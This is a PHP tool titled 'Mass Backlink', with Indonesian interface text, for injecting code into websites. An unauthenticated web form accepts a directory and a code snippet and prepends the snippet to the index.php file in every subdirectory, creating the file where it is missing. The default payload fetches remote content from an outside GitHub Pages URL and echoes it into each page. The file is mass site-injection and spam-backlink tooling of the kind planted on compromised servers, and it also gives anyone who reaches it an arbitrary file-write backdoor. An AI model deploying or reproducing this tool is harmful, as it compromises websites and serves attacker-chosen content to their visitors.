<?php
error_reporting(0);

define('title', 'Mass Backlink');
$directory = dirname(__FILE__);
$script = '
<?php
$url = "https://justikail.github.io/dumb.js";
function fetchContent($url) { 
    $curl = curl_init();
    curl_setopt($curl, CURLOPT_URL, $url);
    curl_setopt($curl, CURLOPT_RETURNTRANSFER, true);
    $content = curl_exec($curl);
    curl_close($curl);
    return $content;
}
echo fetchContent($url);
?>
';

function sisipkanKode($directory, $script) {
    $directories = glob($directory . '/*', GLOB_ONLYDIR);
    foreach ($directories as $dir) {
        $indexFile = $dir . '/index.php';
        if (file_exists($indexFile)) {
            chmod($indexFile, 0644);
            $konten_index_php = file_get_contents($indexFile);
            
            if (strpos($konten_index_php, $script) === false) {
                $konten_index_php = $script . $konten_index_php;
                
                if (file_put_contents($indexFile, $konten_index_php) !== false) {
                    echo '<script>alert("Kode berhasil disisipkan ke semua file index.php dalam direktori yang dimaksud.");</script>';
                } else {
                    echo '<script>alert("Gagal menulis ke file. Mungkin direktori tidak writable.");</script>';
                }
            } else {
                echo '<script>alert("Kode sudah ada dalam file index.php.");</script>';
            }
        } else {
            $handle = fopen($indexFile, 'w');
            if ($handle !== false) {
                if (fwrite($handle, $script) !== false) {
                    fclose($handle);
                    echo '<script>alert("Kode berhasil disisipkan ke semua file index.php dalam direktori yang dimaksud.");</script>';
                } else {
                    fclose($handle);
                    echo '<script>alert("Gagal menulis ke file. Mungkin direktori tidak writable.");</script>';
                }
            } else {
                echo '<script>alert("Gagal membuat file baru. Mungkin direktori tidak writable.");</script>';
            }
        }
    }
}

if (isset($_POST['submit'])) {
    $directory_input = isset($_POST['directory']) ? $_POST['directory'] : '';
    $script_input = isset($_POST['script']) ? $_POST['script'] : '';
    sisipkanKode($directory_input, $script_input);
}
?>

<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.3.3/dist/css/bootstrap.min.css" rel="stylesheet" integrity="sha384-QWTKZyjpPEjISv5WaRU9OFeRpok6YctnYmDr5pNlyT2bRjXh0JMhjY6hW+ALEwIH" crossorigin="anonymous">
    <title><?=title?></title>
</head>
<body class="container bg-black">
    <div class="text-white my-3 px-3 bg-dark rounded d-flex justify-content-center flex-column">
    <h1 class="text-center pt-3"><?=title?></h1>
    <hr class="border border-secondary border-2 opacity-50" />

    <form method="POST" action="" enctype="multipart/form-data" class="mb-3">
    <div class="mb-3">
    <label for="directory" class="form-label">Directory</label>
    <input type="text" class="form-control" name="directory" id="directory" aria-describedby="directoryHelp" value="<?=$directory?>">
    <div id="directoryHelp" class="form-text text-danger"><i>Masukan directory seakurat mungkin!.</i></div>
    </div>
    <div class="mb-3">
    <label for="script" class="form-label">Script</label>
    <textarea class="form-control" name="script" id="script" rows="7" style="resize: none"><?=$script?></textarea>
    </div>
    <button type="submit" name="submit" class="btn btn-primary text-center mx-auto" style="width: 100%">Submit</button>
    </form>
    </div>
</body>
</html>
